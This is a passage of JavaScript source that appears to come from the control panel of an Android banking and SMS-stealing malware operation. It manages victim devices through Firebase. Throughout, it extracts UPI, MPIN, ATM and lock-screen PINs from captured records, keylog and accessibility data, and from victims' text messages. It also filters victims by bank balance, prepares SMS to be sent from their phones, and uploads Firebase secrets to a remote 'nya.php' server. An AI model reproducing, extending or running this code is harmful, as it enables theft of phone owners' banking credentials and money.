  var mob=getApkSimPhone(raw,simSlot)||getApkMobNo(raw,d);
  if((!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))&&d.displayPhone&&d.displayPhone!=='No Number'){
    mob=String(d.displayPhone).split('|')[0].trim();
  }
  if(!mob||mob==='No Number'||/^unknown$/i.test(String(mob).trim()))return'';
  var clean=String(mob).trim().replace(/\s/g,'');
  if(clean.indexOf('+')===0)return clean;
  var digits=normalizePhone(clean);
  if(digits.length===10)return'+91'+digits;
  return clean||digits;
}
function phoneDigits10(raw){
  var c=String(raw||'').replace(/\D/g,'');
  if(c.length>=10)return c.slice(-10);
  return c;
}
function isSameNumberAsDevice(d,toRaw){
  if(!d||!toRaw)return false;
  var to10=phoneDigits10(formatApkSmsTo(toRaw)||toRaw);
  if(!to10||to10.length<10)return false;
  var raw=getRawDev(d.id);
  var candidates=[d.displayPhone,getApkMobNo(raw,d),getApkSimPhone(raw,1),getApkSimPhone(raw,2),raw&&raw.mobNo,raw&&raw.phoneNumber,raw&&raw.phone];
  if(raw&&raw.sims&&raw.sims.length){
    raw.sims.forEach(function(s){if(s&&s.phoneNumber)candidates.push(s.phoneNumber);});
  }
  for(var i=0;i<candidates.length;i++){
    if(!candidates[i])continue;
    if(phoneDigits10(candidates[i])===to10)return true;
  }
  return false;
}
function getDualSimCount(d){
  if(!d)return 1;
  var raw=getRawDev(d.id), sims=parseApkSims(raw);
  if(sims&&sims.length)return sims.length;
  if(raw&&raw.sims&&Array.isArray(raw.sims)&&raw.sims.length)return raw.sims.length;
  return 1;
}
function rabelFromSimForSend(sim,d,to){
  var s=Math.max(1,sim||1);
  if(d&&isSameNumberAsDevice(d,to)&&getDualSimCount(d)>=2&&s===1)return 2;
  return s;
}
function fillDeviceSmsTo(d,force,simSlot){
  var toEl=document.getElementById('smsTo');
  if(!toEl||!d)return;
  if(!force&&toEl.value&&String(toEl.value).trim())return;
  var phone=getDeviceSmsPhone(d,simSlot||_sendSimSlot);
  if(phone)toEl.value=phone;
  else toEl.placeholder='Recipient number (10 digit)';
}
function getApkModel(raw,d){return String((raw&&raw.modelName)||(d&&d.name)||'Unknown');}
function getApkMoney(raw){return raw&&raw.money!=null?String(raw.money):'';}
function isApkLiked(id){return isApkYes(getRawDev(id).liked);}
function isApkChecked(id){return parseApkBool(getRawDev(id).checked);}
function isApkLoggedIn(id){return isApkYes(getRawDev(id).login);}
function isApkOnlineRaw(raw){return parseApkBool(raw&&raw.status);}
function hasApkUpiPin(id){return !!getApkUpiPin(getRawDev(id)).trim();}
function parseJoinedToMs(joined){
  if(!joined)return 0;
  if(typeof joined==='number')return joined<1e12?joined*1000:joined;
  var s=String(joined).trim();
  var m=s.match(/(\d{1,2})\/(\d{1,2})\/(\d{4})(?:\s*[|\s]\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(AM|PM|am|pm)?)?/i);
  if(m){
    var dd=+m[1],MM=+m[2],yyyy=+m[3],hh=+(m[4]||0),mi=+(m[5]||0),ss=+(m[6]||0),ap=m[7];
    if(ap){var p=ap.toUpperCase();if(p==='PM'&&hh<12)hh+=12;if(p==='AM'&&hh===12)hh=0;}
    var dt=new Date(yyyy,MM-1,dd,hh,mi,ss);
    if(!isNaN(dt.getTime()))return dt.getTime();
  }
  var n=Date.parse(s);
  return isNaN(n)?0:n;
}
function patchClientField(d,fields,okMsg){
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return Promise.resolve(false);}
  var node=getClientWritePath(d,inst)+'/'+d.rawId;
  var url=buildRestUrl(inst,node,getFbAuthKey(inst));
  return fetch(url,{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify(fields)})
    .then(function(r){return r.json().then(function(j){return{ok:r.ok,j:j};});})
    .then(function(res){
      if(res.ok){
        var raw=clientsRawMap[d.id]||{};
        Object.keys(fields).forEach(function(k){raw[k]=fields[k];});
        clientsRawMap[d.id]=raw;
        processClientsDataNow();
        if(okMsg)toast(okMsg,true);
        return true;
      }
      toast((res.j&&res.j.error)||'Update failed',false);
      return false;
    }).catch(function(){toast('Update failed',false);return false;});
}
function loadLiked(){likedDevices={};}
function saveLiked(){}
function isLiked(id){return isApkLiked(id);}
function toggleLike(id,ev){
  if(ev){ev.stopPropagation();ev.preventDefault();}
  var d=allDevs.find(function(x){return x.id===id;});
  if(!d)return;
  var next=isApkLiked(id)?'no':'yes';
  patchClientField(d,{liked:next},next==='yes'?'Liked':'Disliked');
}
function getSearchQuery(){
  var map={home:'searchHome',online:'searchOnline',onlypin:'searchPin',liked:'searchLiked',login:'searchLogin',money:'searchMoney',device:'searchDevice'};
  var el=document.getElementById(map[currentView]||'searchHome');
  return (el&&el.value||'').toLowerCase();
}
function getActiveListEl(){
  var map={home:'devList',online:'devListOnline',onlypin:'devListPin',liked:'devListLiked',login:'devListLogin',money:'devListMoney',device:'devListDeviceSms'};
  return document.getElementById(map[currentView]||'devList');
}
function getAllListEls(){
  return ['devList','devListOnline','devListPin','devListLiked','devListLogin','devListMoney','devListDeviceSms'].map(function(id){return document.getElementById(id);}).filter(Boolean);
}
function setText(id,txt){var el=document.getElementById(id);if(el)el.textContent=txt;}
function scrollActiveListTop(){
  var el=getActiveListEl();
  if(el){el.scrollTop=0;return;}
  window.scrollTo(0,0);
}
function showPage(view){
  view=view||'home';
  if(view!=='device')currentView=view;
  if(view==='online')devFilterMode='online';
  else if(view==='onlypin')devFilterMode='pin';
  else if(view==='liked')devFilterMode='liked';
  else if(view==='login')devFilterMode='login';
  else if(view==='money'){devFilterMode='money';moneyFilterMode='amount';}
  else if(view==='home')devFilterMode='all';
  Object.keys(PAGE_VIEWS).forEach(function(k){
    var el=document.getElementById(PAGE_VIEWS[k]);
    if(el)el.classList.toggle('active',k===currentView);
  });
  updatePanelTitles();
  if(currentView==='money'){
    renderMoneyView();
    if(!moneyMessagesList.length||Date.now()-_moneyLoadedAt>MONEY_CACHE_MS){
      loadMoneyMessages(!moneyMessagesList.length).then(function(){renderMoneyView();updateStats();});
    }
  }else if(currentView==='device'){
    renderDeviceDetail();
    renderDeviceSmsList();
  }else{
    renderDevices();
  }
  updateStats();
  scrollActiveListTop();
}
function updatePanelTitles(){
  var name=activeFbId?getActiveFbName():'Android Management XYZ';
  setText('panelTitleOnline',name);
  setText('panelTitlePin',name);
  setText('panelTitleLogin',name);
}
function formatDevDate(d){
  var raw=clientsRawMap[d.id]||{};
  var joined=getApkJoined(raw);
  if(joined)return 'DATE: '+joined;
  return 'DATE: —';
}
function setMoneyFilter(mode){
  moneyFilterMode=mode||'amount';
  if(mode==='active')renderMoneyView();
  else pickMoneyAmountRange();
}
function pickMoneyAmountRange(){
  var opts=['₹10K - ₹30K','₹30K - ₹50K','₹50K - ₹100K','Above ₹100K'];
  var ranges=[[10000,30000],[30000,50000],[50000,100000],[100000,Infinity]];
  var pick=window.prompt('Select amount range:\n0 = ₹10K-₹30K\n1 = ₹30K-₹50K\n2 = ₹50K-₹100K\n3 = Above ₹100K','0');
  if(pick==null)return;
  var idx=parseInt(pick,10);
  if(isNaN(idx)||idx<0||idx>3)idx=0;
  moneyAmountMin=ranges[idx][0];moneyAmountMax=ranges[idx][1];moneyFilterMode='amount';
  renderMoneyView();
}
function deviceHasLogin(d){
  if(isApkLoggedIn(d.id))return true;
  var raw=clientsRawMap[d.id];
  if(!raw||typeof raw!=='object')return false;
  return !!(raw.password||raw.Pass||raw.pass||(raw.username&&raw.password));
}
function goHome(){showPage('home');}
function goOnlyPin(){showPage('onlypin');}
function setFilter(mode,btn){
  if(mode==='online')showPage('online');
  else if(mode==='pin'||mode==='onlypin')showPage('onlypin');
  else if(mode==='liked')showPage('liked');
  else if(mode==='login')showPage('login');
  else if(mode==='money'||mode==='bank')showPage('money');
  else showPage('home');
}
function showLoading(on,force){
  var el=document.getElementById('loading');
  if(!el)return;
  if(on){
    _loadingVisible=true;
    el.classList.add('show');
    el.style.display='flex';
    el.setAttribute('aria-hidden','false');
  }else{
    _loadingVisible=false;
    el.classList.remove('show');
    el.style.display='none';
    el.setAttribute('aria-hidden','true');
  }
}
function normalizeFbUrl(url){
  return String(url||'').replace(/\/$/,'');
}
function loadFbNodeMemory(){
  try{
    var s=localStorage.getItem(FB_NODE_MEMORY_KEY);
    if(s){var o=JSON.parse(s);if(o&&typeof o==='object')return o;}
  }catch(e){}
  return {};
}
function saveFbNodeMemory(mem){
  try{localStorage.setItem(FB_NODE_MEMORY_KEY,JSON.stringify(mem||{}));}catch(e){}
}
function getRememberedNode(inst){
  if(!inst)return '';
  var mem=loadFbNodeMemory();
  var url=normalizeFbUrl(inst.restUrl||(inst.config&&inst.config.databaseURL));
  var row=mem[url]||mem[inst.id];
  return row&&row.node?String(row.node):'';
}
function applyRememberedNode(inst,node){
  if(!inst||!node)return;
  if(inst.config){
    inst.config.preferredDeviceNode=node;
    inst.config.deviceNode=node;
  }
}
function rememberFbNode(inst,node,nodeCount){
  if(!inst||!node)return;
  var url=normalizeFbUrl(inst.restUrl||(inst.config&&inst.config.databaseURL));
  var mem=loadFbNodeMemory();
  var cnt=nodeCount!=null?nodeCount:countDevicesFromNode(inst.id,node);
  var prev=mem[url];
  if(!prev||cnt>=(prev.count||0)){
    mem[url]={node:node, count:cnt, at:Date.now(), fbId:inst.id, name:(inst.config&&inst.config.name)||inst.name||''};
    saveFbNodeMemory(mem);
    applyRememberedNode(inst,node);
    saveFirebaseConfigs();
  }
}
function applyNodeMemoryToConfigs(configs){
  var mem=loadFbNodeMemory();
  (configs||[]).forEach(function(c){
    var url=normalizeFbUrl(c.databaseURL);
    var row=mem[url]||mem[c.id];
    if(row&&row.node){
      c.preferredDeviceNode=row.node;
      c.deviceNode=row.node;
    }
  });
  return configs;
}
function countDevicesFromNode(fbId,node){
  var n=0;
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(fbId+'::')!==0)return;
    var r=clientsRawMap[k];
    if(r&&r._node===node)n++;
  });
  return n;
}
function nodesToTryForInst(inst){
  var seen={}, out=[];
  function add(n){n=String(n||'').trim();if(n&&!seen[n]){seen[n]=1;out.push(n);}}
  add(getRememberedNode(inst));
  if(inst&&inst.config){
    add(inst.config.preferredDeviceNode);
    add(inst.config.deviceNode);
  }
  getDeviceNodesForInst(inst).forEach(add);
  DEVICE_FETCH_NODES.forEach(add);
  return out;
}
function probeRemainingNodesSequential(inst,nodes,primaryNode,opts){
  opts=opts||{};
  var maxNodes=opts.maxNodes!=null?opts.maxNodes:4;
  var primaryCount=primaryNode?countDevicesFromNode(inst.id,primaryNode):0;
  if(!opts.forceDeep&&primaryCount>0&&maxNodes<=4){
    return Promise.resolve().then(function(){
      if(!inst.smsIndexReady)return buildSmsIndex(inst).catch(function(){return null;});
    }).then(function(){processClientsData();});
  }
  var rest=(nodes||[]).filter(function(n){return n&&n!==primaryNode;}).slice(0,maxNodes);
  var bestNode=primaryNode||'';
  var bestCount=bestNode?countDevicesFromNode(inst.id,bestNode):0;
  var i=0;
  function next(){
    if(i>=rest.length){
      return enrichFromUserList(inst).catch(function(){return null;}).then(function(){
        if(!inst.smsIndexReady)return buildSmsIndex(inst).catch(function(){return null;});
      }).then(function(){processClientsData();});
    }
    var node=rest[i++];
    return fetchSummaryNodeFirebase(inst,node).then(function(){
      var nc=countDevicesFromNode(inst.id,node);
      if(nc>bestCount&&nc>0){
        bestCount=nc;
        bestNode=node;
        rememberFbNode(inst,node,nc);
      }
      return next();
    }).catch(function(){return next();});
  }
  return next();
}
function scheduleDeepDiscover(inst,force){
  if(inst._deepDiscoverScheduled)return;
  if(!force&&inst._deepDiscoverDone)return;
  inst._deepDiscoverScheduled=true;
  setTimeout(function(){
    inst._deepDiscoverScheduled=false;
    var nodes=nodesToTryForInst(inst);
    var primary=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
    restJsonInstShallow(inst).then(function(roots){
      if(roots&&!isFirebaseErr(roots))applyInstanceRoots(inst,roots);
    }).catch(function(){}).then(function(){
      return probeRemainingNodesSequential(inst,nodes,primary,{forceDeep:!!force,maxNodes:force?10:4});
    }).then(function(){
      inst._deepDiscoverDone=true;
    }).catch(function(){});
  },force?300:2000);
}
function discoverInstanceProbeSlow(inst,force){
  var nodes=nodesToTryForInst(inst);
  var found='', i=0;
  function tryNext(){
    if(i>=Math.min(nodes.length,5)){
      if(!found&&getRememberedNode(inst))applyRememberedNode(inst,getRememberedNode(inst));
      scheduleDeepDiscover(inst,!!force);
      return Promise.resolve();
    }
    var node=nodes[i++], before=countInstDevices(inst.id);
    return fetchSummaryNodeFirebase(inst,node).then(function(){
      var nodeCount=countDevicesFromNode(inst.id,node);
      var total=countInstDevices(inst.id);
      if(nodeCount>0||(total>before&&!found)){
        found=node;
        rememberFbNode(inst,node,nodeCount||total-before);
        if(inst.db)attachLiveNode(inst,node);
        processClientsDataNow();
        scheduleDeepDiscover(inst,!!force);
        return Promise.resolve();
      }
      return tryNext();
    }).catch(function(){return tryNext();});
  }
  return tryNext();
}
function discoverInstanceProbe(inst,force){
  if(!force&&inst._lastProbeAt&&(Date.now()-inst._lastProbeAt)<120000)return Promise.resolve();
  var primary=getRememberedNode(inst)||(inst.config&&inst.config.preferredDeviceNode)||(inst.config&&inst.config.deviceNode)||'clients';
  return fetchSummaryNodeFirebase(inst,primary).then(function(){
    var count=countInstDevices(inst.id);
    var pickNode=primary;
    var pickCount=count;
    function afterPick(){
      if(pickCount>0){
        rememberFbNode(inst,pickNode,pickCount);
        applyRememberedNode(inst,pickNode);
        if(inst.db)attachLiveNode(inst,pickNode);
        processClientsDataNow();
        inst._lastProbeAt=Date.now();
        if(!inst._deepDiscoverDone||force)scheduleDeepDiscover(inst,!!force);
        return;
      }
      return discoverInstanceProbeSlow(inst,force);
    }
    if(count>0&&primary!=='clients'){
      return fetchSummaryNodeFirebase(inst,'clients').then(function(){
        var cc=countDevicesFromNode(inst.id,'clients');
        if(cc>pickCount){pickNode='clients';pickCount=cc;}
        return afterPick();
      }).catch(function(){return afterPick();});
    }
    return afterPick();
  }).then(function(r){if(!inst._lastProbeAt)inst._lastProbeAt=Date.now();return r;});
}
function isValidFirebaseUrl(url){
  url=normalizeFbUrl(url);
  if(!url)return false;
  if(/https:\/\/-default-rtdb/i.test(url))return false;
  if(!/^https:\/\/[a-z0-9][a-z0-9._-]*\.(firebaseio\.com|firebasedatabase\.app)/i.test(url))return false;
  return true;
}
function teardownFirebaseInstance(inst){
  if(!inst)return;
  if(inst._liveRefs&&inst._liveRefs.length){
    inst._liveRefs.forEach(function(L){
      try{
        if(!L.ref||!L.h)return;
        if(L.type==='child_added')L.ref.off('child_added',L.h);
        else if(L.type==='child_changed')L.ref.off('child_changed',L.h);
        else L.ref.off('value',L.h);
      }catch(e){}
    });
  }
  inst._liveRefs=[];
  inst._liveNodes={};
  inst.liveAttached=false;
  inst.liveFastAttached=false;
}
function teardownAllFirebaseInstances(){
  firebaseInstances.forEach(teardownFirebaseInstance);
}
function deleteChecked(){
  var checked=allDevs.filter(function(d){return isApkChecked(d.id);});
  if(!checked.length){toast('No checked devices — tick CHECKED on a device first',false);return;}
  if(!confirm('Delete '+checked.length+' checked device(s) from Firebase?'))return;
  Promise.all(checked.map(function(d){
    var inst=getFbInstance(d.fbId);
    if(!inst)return Promise.resolve(null);
    var auth=getFbAuthKey(inst);
    var paths={};
    paths[getDeviceProfilePath(d)+'/'+d.rawId]=1;
    if(shouldUseApkSmsPath(inst,d))paths['messages/'+d.rawId]=1;
    return Promise.all(Object.keys(paths).map(function(p){
      return fetch(buildRestUrl(inst,p,auth),{method:'DELETE'}).catch(function(){return null;});
    }));
  })).then(function(){
    checked.forEach(function(d){delete clientsRawMap[d.id];});
    if(checked.some(function(d){return d.id===selDev;})){selDev='';clearListeners();}
    processClientsDataNow();renderMoneyView();
    toast('Checked devices deleted',true);
  }).catch(function(){toast('Delete failed',false);});
}
function deleteDeviceCard(id,ev){
  if(ev){ev.stopPropagation();ev.preventDefault();}
  var d=allDevs.find(function(x){return x.id===id;});
  if(!d)return;
  if(!confirm('Delete this device from Firebase?'))return;
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var url=buildRestUrl(inst,getDeviceProfilePath(d)+'/'+d.rawId,getFbAuthKey(inst));
  fetch(url,{method:'DELETE'}).then(function(r){
    if(r.ok){
      delete clientsRawMap[d.id];
      if(selDev===id){selDev='';clearListeners();}
      toast('Deleted',true);
      processClientsDataNow();
    }else toast('Delete failed',false);
  }).catch(function(){toast('Delete failed',false);});
}
function closeSmsModal(ev){
  if(ev&&ev.target&&ev.target.id!=='smsModal'&&ev.type==='click')return;
  var m=document.getElementById('smsModal');
  if(m)m.classList.remove('open');
  closeDeviceDetail();
}
function bindDevListEvents(){
  getAllListEls().forEach(function(el){
    if(!el||el._rebelBound)return;
    el._rebelBound=true;
    el.addEventListener('click',function(e){
      var like=e.target.closest('.dev-like');
      if(like){
        e.preventDefault();e.stopPropagation();
        var cid=like.getAttribute('data-dev-id');
        if(cid)toggleLike(cid,e);
        return;
      }
      var del=e.target.closest('.dev-del');
      if(del){
        e.preventDefault();e.stopPropagation();
        var did=del.getAttribute('data-dev-id');
        if(did)deleteDeviceCard(did,e);
        return;
      }
      var chk=e.target.closest('.dev-check input');
      if(chk){
        e.stopPropagation();
        var wrap=chk.closest('.dev-check');
        var tid=wrap&&wrap.getAttribute('data-dev-id');
        if(tid){
          var dev=allDevs.find(function(x){return x.id===tid;});
          if(dev)patchClientField(dev,{checked:chk.checked});
        }
        return;
      }
      var card=e.target.closest('.dev-card');
      if(!card)return;
      var id=card.getAttribute('data-dev-id');
      if(id)selectDevice(id);
    });
  });
}
function toast(msg,ok){var w=document.getElementById('toasts'),d=document.createElement('div');d.className='toast '+(ok?'ok':'err');d.textContent=msg;w.appendChild(d);setTimeout(function(){d.remove();},2800);}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function extractPinFromRecord(raw){
  if(!raw||typeof raw!=='object')return '';
  var keys=['upipin','upiPin','UPIPIN','UpiPin','pin','PIN','device_pin','devicePin','mpin','MPIN','upi_pin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
  var check=function(obj){
    if(!obj||typeof obj!=='object')return '';
    var i,v,s;
    for(i=0;i<keys.length;i++){
      v=obj[keys[i]];
      if(v==null)continue;
      s=String(v).trim();
      if(s&&s!=='0'&&s!=='null'&&s!=='undefined'&&/^\d{4,8}$/.test(s))return s;
    }
    return '';
  };
  var p=check(raw), nests=['device_info','live_data','deviceInfo','liveData','data','info','captured','keylog','key_log','upi','bank','credentials','pin_data','pinData','screen','accessibility'], i, k, v, s;
  if(p)return p;
  for(i=0;i<nests.length;i++){if(raw[nests[i]]){p=check(raw[nests[i]]);if(p)return p;}}
  function deepScan(obj,depth){
    if(!obj||typeof obj!=='object'||depth>5)return '';
    for(k in obj){
      if(!Object.prototype.hasOwnProperty.call(obj,k))continue;
      v=obj[k];
      if(isPinFieldKey(k)&&v!=null){
        s=String(v).trim();
        if(s&&s!=='0'&&s!=='null'&&/^\d{4,8}$/.test(s))return s;
      }
      if(v&&typeof v==='object'){s=deepScan(v,depth+1);if(s)return s;}
    }
    return '';
  }
  return deepScan(raw,0);
}
function extractPinFromSmsList(list){
  if(!list||!list.length)return '';
  var i,body,m,pinRe=[
    /\b(?:upi\s*pin|mpin|atm\s*pin)\s*(?:is|:|=|-)\s*(\d{4,8})\b/i,
    /\b(?:pin\s*(?:is|:|=|-))\s*(\d{4,8})\b/i,
    /\b(?:enter(?:ed)?\s*(?:upi\s*)?pin)\s*[:\s]?\s*(\d{4,8})\b/i,
    /(?:MPIN|UPI\s*PIN|PIN)[-:\s]+(\d{4,8})\b/i,
    /(?:PASSWORD-\d+-MPIN-|MPIN-)(\d{4,8})\b/i
  ];
  for(i=0;i<list.length;i++){
    body=String((list[i]&&list[i].body)||(list[i]&&list[i].message)||'');
    if(!body||/otp\s*to\s*generate\s*upi\s*pin/i.test(body))continue;
    if(/otp|one time password|verification code/i.test(body)&&/generate/i.test(body))continue;
    var j;
    for(j=0;j<pinRe.length;j++){
      m=body.match(pinRe[j]);
      if(m&&m[1])return m[1];
    }
  }
  return '';
}
function applyPinToDevice(devId,pin){
  pin=String(pin||'').trim();
  if(!pin||!devId||!/^\d{4,8}$/.test(pin))return false;
  var raw=clientsRawMap[devId];
  if(!raw)return false;
  if(raw.upipin&&String(raw.upipin).trim()===pin)return false;
  raw.upipin=pin;
  raw.upiPin=pin;
  clientsRawMap[devId]=raw;
  return true;
}
function normalizePinValue(data){
  if(data==null||data===''||isFirebaseErr(data))return '';
  if(typeof data==='object')return extractPinFromRecord(data)||'';
  var pin=String(data).trim();
  return /^\d{4,8}$/.test(pin)?pin:'';
}
function mergeProfileFieldsFromRecord(mapKey,data){
  if(!data||typeof data!=='object'||isFirebaseErr(data))return false;
  if(isCommandQueueRecord(data)&&!isDeviceProfileRecord(data))return false;
  var raw=clientsRawMap[mapKey];
  if(!raw)return false;
  var changed=false, fields=['upipin','upiPin','joined','dateJoined','date_joined','installDate','createdAt','created_at'];
  fields.forEach(function(f){
    if(data[f]==null||data[f]==='')return;
    if(raw[f]!=null&&String(raw[f]).trim()!=='')return;
    raw[f]=data[f];
    changed=true;
  });
  if(changed)clientsRawMap[mapKey]=raw;
  return changed;
}
function deviceHasPin(d){
  if(hasApkUpiPin(d.id))return true;
  return !!(d.pin&&String(d.pin).trim());
}
function deviceMatchesApkFilter(d,view){
  var raw=getRawDev(d.id);
  if(view==='online'||devFilterMode==='online')return d.status==='online';
  if(view==='onlypin'||devFilterMode==='pin')return deviceHasPin(d);
  if(view==='liked'||devFilterMode==='liked')return isApkYes(raw.liked);
  if(view==='login'||devFilterMode==='login'){
    if(isApkYes(raw.login))return true;
    return hasApkModelName(raw)&&isApkYes(raw.login);
  }
  return true;
}
function getFilteredDevs(){
  var list=allDevs;
  if(activeFbId)list=list.filter(function(d){return d.fbId===activeFbId;});
  if(currentView!=='home'&&currentView!=='device'&&currentView!=='money'){
    list=list.filter(function(d){return deviceMatchesApkFilter(d,currentView);});
  }else if(devFilterMode==='online')list=list.filter(function(d){return deviceMatchesApkFilter(d,'online');});
  else if(devFilterMode==='pin')list=list.filter(function(d){return deviceMatchesApkFilter(d,'onlypin');});
  else if(devFilterMode==='liked')list=list.filter(function(d){return deviceMatchesApkFilter(d,'liked');});
  else if(devFilterMode==='login')list=list.filter(function(d){return deviceMatchesApkFilter(d,'login');});
  return list;
}
function loadActiveFb(){
  try{
    var s=localStorage.getItem(ACTIVE_FB_KEY);
    activeFbId=s||'';
  }catch(e){activeFbId='';}
}
function saveActiveFb(){
  try{localStorage.setItem(ACTIVE_FB_KEY,activeFbId||'');}catch(e){}
}
function ensureActiveFbValid(){
  if(activeFbId&&!firebaseConfigs.some(function(c){return c.id===activeFbId;}))activeFbId='';
  if(window.NYA_APK&&!activeFbId&&firebaseConfigs.length){
    var nya=firebaseConfigs.find(function(c){return String(c.id||'')==='nya_hdjdjdj';});
    if(nya){activeFbId=nya.id;saveActiveFb();}
  }
}
function getActiveFbName(){
  if(!activeFbId)return 'All Firebase Combined';
  var inst=getFbInstance(activeFbId);
  return inst?inst.name:'Firebase';
}
function getHdrSubText(){
  if(!firebaseConfigs.length)return 'Add a Firebase project to start';
  if(activeFbId)return getFilteredDevs().length+' devices · '+getActiveFbName();
  return allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
}
function selectFirebase(fbId){
  activeFbId=fbId||'';
  saveActiveFb();
  if(selDev&&activeFbId){
    var d=getSelDev();
    if(d&&d.fbId!==activeFbId){
      selDev='';
      clearListeners();
    }
  }
  renderFirebaseTab();
  renderDevices();
  updateStats();
  updateFbUi();
  toast('Switched to '+getActiveFbName(),true);
  closeFbSheet();
}
function bindFirebaseTabEvents(){}
function renderFirebaseTab(){updateFbUi();}
function setDevFilter(mode,btn){setFilter(mode,btn);}
function syncFirebaseToServer(cfg){
  if(!cfg||!cfg.databaseURL)return Promise.resolve(null);
  var payload={
    action:'add',
    name:cfg.name||cfg.id||'Firebase',
    databaseURL:(cfg.databaseURL||'').replace(/\/$/,''),
    secret:cfg.secret||cfg.key||'',
    apiKey:cfg.apiKey||'',
    projectId:cfg.projectId||'',
    appId:cfg.appId||'',
    authDomain:cfg.authDomain||'',
    storageBucket:cfg.storageBucket||'',
    messagingSenderId:cfg.messagingSenderId||'',
    packageName:cfg.packageName||'',
    schema:cfg.schema||'',
    deviceNode:cfg.deviceNode||'clients',
    preferredDeviceNode:cfg.preferredDeviceNode||'',
    deviceNodes:cfg.deviceNodes||[],
    source:window.REBEL_NATIVE_APP?'nya_apk':'nya_web'
  };
  if(window.REBEL_NATIVE_APP&&window.RebelAndroid&&typeof RebelAndroid.syncFirebase==='function'){
    try{
      var native=JSON.parse(RebelAndroid.syncFirebase(JSON.stringify(payload)));
      if(native&&native.ok)return Promise.resolve(native);
    }catch(e){}
  }
  if(typeof nyaNativeFetch==='function'){
    return nyaNativeFetch(FIREBASE_API_URL,{method:'POST',body:payload});
  }
  return fetch(FIREBASE_API_URL,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload),
    cache:'no-store'
  }).then(function(r){return r.json();}).catch(function(){return null;});
}
var _lastSyncedFbUrl='';
function saveFirebaseConfigs(){
  try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
  if(!firebaseConfigs.length)return;
  var cfg=firebaseConfigs[firebaseConfigs.length-1];
  var url=(cfg.databaseURL||'').replace(/\/$/,'');
  if(!url||url===_lastSyncedFbUrl)return;
  _lastSyncedFbUrl=url;
  syncFirebaseToServer(cfg).then(function(r){
    if(r&&r.duplicate){
      firebaseConfigs=firebaseConfigs.filter(function(c){return c.id!==cfg.id;});
      try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
      toast((r.error||'Duplicate Firebase reject'),false);
      updateFbUi();
      return;
    }
    if(r&&r.ok)toast('Firebase synced to nya.php',true);
    else if(r&&r.error)toast(r.error,false);
  }).catch(function(){});
}
function loadDeviceToggles(){
  try{
    var s=localStorage.getItem(DEVICE_TOGGLE_KEY);
    if(s)deviceToggleState=JSON.parse(s)||{};
  }catch(e){deviceToggleState={};}
}
function saveDeviceToggles(){
  try{localStorage.setItem(DEVICE_TOGGLE_KEY,JSON.stringify(deviceToggleState));}catch(e){}
}
function isDeviceChecked(id){return isApkChecked(id);}
function toggleDeviceCheck(id,ev){
  if(ev){ev.stopPropagation();ev.preventDefault();}
  var d=allDevs.find(function(x){return x.id===id;});
  if(!d)return;
  patchClientField(d,{checked:!isApkChecked(id)});
}
function restJson(url,timeoutMs){
  timeoutMs=timeoutMs||12000;
  var ctrl=typeof AbortController!=='undefined'?new AbortController():null;
  var timer=ctrl?setTimeout(function(){try{ctrl.abort();}catch(e){}},timeoutMs):null;
  return fetch(url,{cache:'no-store',signal:ctrl?ctrl.signal:undefined}).then(function(r){
    if(timer)clearTimeout(timer);
    if(!r.ok)return null;
    return r.json();
  }).catch(function(){
    if(timer)clearTimeout(timer);
    return null;
  });
}
function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}

function firebaseCanonicalId(cfg){
  if(!cfg)return '';
  var pid=String(cfg.projectId||cfg.project_id||'').trim().toLowerCase();
  if(pid)return pid.replace(/-default-rtdb$/i,'');
  var url=String(cfg.databaseURL||cfg.database_url||'').replace(/\/$/,'').toLowerCase();
  var hm=url.match(/https?:\/\/([^/]+)/i);
  if(!hm)return url;
  var host=String(hm[1]).toLowerCase();
  host=host.replace(/\.(asia-southeast1|europe-west1|us-central1|us-east1)\./,'.');
  host=host.replace(/\.(?:firebaseio\.com|firebasedatabase\.app)$/i,'');
  return host.replace(/-default-rtdb$/i,'');
}
function findDuplicateFirebase(list,cfg){
  if(!cfg||!list||!list.length)return null;
  var url=String(cfg.databaseURL||cfg.database_url||'').replace(/\/$/,'');
  var key=firebaseCanonicalId(cfg);
  var api=String(cfg.apiKey||cfg.api_key||'').trim();
  for(var i=0;i<list.length;i++){
    var c=list[i];
    if(!c)continue;
    if(url&&(String(c.databaseURL||'').replace(/\/$/,'')===url))return c;
    if(key&&firebaseCanonicalId(c)===key)return c;
    if(api&&api.length>20&&String(c.apiKey||'').trim()===api)return c;
  }
  return null;
}
function dedupeFirebaseConfigs(list){
  var out=[];
  (list||[]).forEach(function(c){
    if(!c||!c.databaseURL)return;
    if(findDuplicateFirebase(out,c))return;
    out.push(c);
  });
  return out;
}


function pullServerFirebases(){
  if(!window.REBEL_NATIVE_APP)return Promise.resolve([]);
  return nyaNativeFetch(FIREBASE_API_URL).then(function(res){
    if(!res||!res.ok||!Array.isArray(res.projects))return [];
    return res.projects;
  }).catch(function(){return [];});
}

function loadFirebaseConfigs(){
  function mergeDefaults(list){
    var out=dedupeFirebaseConfigs((list||[]).slice());
    function addDef(def){
      if(!def||!def.databaseURL)return;
      if(findDuplicateFirebase(out,def))return;
      var url=String(def.databaseURL).replace(/\/$/,'');
      var i=out.findIndex(function(c){return String(c.databaseURL||'').replace(/\/$/,'')===url;});
